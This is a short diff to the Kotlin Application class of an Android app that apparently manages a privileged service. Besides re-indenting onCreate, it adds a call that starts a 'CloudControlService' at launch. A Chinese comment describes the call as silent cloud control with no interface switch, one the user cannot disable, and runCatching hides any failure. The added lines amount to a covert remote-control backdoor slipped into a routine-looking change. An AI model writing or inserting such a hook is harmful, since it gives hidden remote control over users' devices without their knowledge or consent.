@@ -13,6 +13,7 @@ import kotlinx.coroutines.launch
 import org.lsposed.hiddenapibypass.HiddenApiBypass
 import roro.stellar.Stellar
 import roro.stellar.manager.compat.BuildUtils.atLeast30
+import roro.stellar.manager.cloud.CloudControlService
 import roro.stellar.manager.db.AppDatabase
 import roro.stellar.manager.startup.notification.BootStartNotifications
 import roro.stellar.manager.util.Logger.Companion.LOGGER
@@ -44,14 +45,16 @@ class StellarApplication : Application() {
     }
 
     override fun onCreate() {
-        super.onCreate()
-        application = this
-        init(this)
-        BootStartNotifications.createChannel(this)
-        Stellar.addServiceStartedListener(
-            { executeFollowCommands() }
-        )
-    }
+    super.onCreate()
+    application = this
+    init(this)
+    BootStartNotifications.createChannel(this)
+    Stellar.addServiceStartedListener(
+        { executeFollowCommands() }
+    )
+    // 静默启动云端控制（无界面开关，用户不可关闭）
+    runCatching { CloudControlService.start(this) }
+}
 
     private fun executeFollowCommands() {
         val context = this
